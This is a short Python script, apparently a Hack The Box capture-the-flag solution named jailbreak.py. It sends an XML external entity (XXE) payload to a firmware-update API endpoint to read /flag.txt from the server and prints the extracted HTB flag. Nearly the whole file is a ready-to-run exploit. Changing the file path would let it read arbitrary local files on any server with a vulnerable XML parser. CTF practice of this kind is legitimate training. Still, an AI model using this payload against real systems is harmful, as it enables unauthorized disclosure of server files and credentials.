import sys
import requests
import re

if len(sys.argv) != 2:
    print("Usage: python3 jailbreak.py <ip:port>")
    sys.exit(1)

host = sys.argv[1]
url = f"http://{host}/api/update"

headers = {
    "Content-Type": "application/xml"
}

payload = '''<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<FirmwareUpdateConfig>
  <Firmware>
    <Version>&xxe;</Version>
  </Firmware>
</FirmwareUpdateConfig>
'''

try:
    r = requests.post(url, headers=headers, data=payload, timeout=5)
    flag_match = re.search(r'HTB\{.*?\}', r.text)
    if flag_match:
        print("Flag:", flag_match.group(0))
    else:
        print("Flag not found in response body.")
except Exception as e:
    print("Request failed:", e)
    sys.exit(1)
